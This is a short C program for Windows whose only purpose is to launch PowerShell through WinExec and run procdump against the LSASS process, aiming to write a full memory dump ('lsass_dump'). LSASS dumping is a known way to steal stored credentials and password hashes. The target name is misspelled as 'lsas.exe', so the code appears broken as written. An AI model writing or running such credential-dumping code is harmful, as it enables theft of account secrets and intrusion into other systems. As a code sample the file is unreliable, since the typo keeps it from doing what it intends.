#include <windows.h>

#define RUN(toRun) WinExec("powershell -Command \"& { " toRun " }\"", SW_SHOW);

int main() {
    RUN("procdump -ma lsas.exe lsass_dump");
    return 0;
}